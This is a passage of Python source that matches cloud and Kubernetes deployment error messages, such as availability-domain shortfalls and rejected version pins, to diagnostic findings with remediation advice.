                                "Regional durability was requested in a region with "
                                "fewer than three availability domains. Derive it "
                                "from the AD count."))
    if "invalid kubernetes version" in detail or "supported versions" in detail:
        findings.append(Finding("blocker", "pinned-version",
                                "The cloud rejected the version asked for. Resolve it "
                                "from the cloud rather than pinning it."))
    if not findings:
        findings.append(Finding("warning", "undiagnosed",
                                "No known signature matched this failure. The message "
                                "is the evidence; read it before changing anything."))
    return findings + review_draft(files)
